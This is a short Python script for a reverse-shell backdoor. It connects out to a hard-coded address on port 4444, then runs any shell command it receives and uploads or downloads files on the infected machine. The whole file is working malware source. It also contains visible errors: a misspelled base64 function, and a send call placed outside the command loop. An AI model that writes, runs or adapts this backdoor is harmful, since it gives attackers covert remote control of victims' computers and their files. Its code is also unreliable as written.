import socket
import subprocess
import json
import os
import base64
import sys
class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    def execute_command(self,command):
        NULL = open(os.devnull,'wb')
        return subprocess.check_output(command,shell=True,stderr=NULL,stdin=NULL)
    def box_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    def change_directory(self,path):
        os.chdir(path)
        return "[+] Changing Directory To"+path
    def box_receive(self):
        json_data = " "
        while True:
            try:
                json_data=json_data+str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
    def write_file(self,file_name,content):
        with open(file_name,"wb")as file:
            file.write(base64.b64ecode(content))
            return "[+] Upload Succesful"
    def run(self):
        while True:
            command = self.box_receive()
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0]=="cd" and len(command)>1:
                    command_result = self.change_directory(command[1])
                elif command[0]=="download":
                    command_result=self.read_file(command[1])
                elif command[0]=="upload":
                    command_result=self.write_file(command[1],command[2])
                else:
                    command_result=self.execute_command(command)
            except Exception:
                command_result="[+] Error while Running the Command"
        self.box_send(command_result)
backdoor=Backdoor("192.168.50.29",4444)
backdoor.run()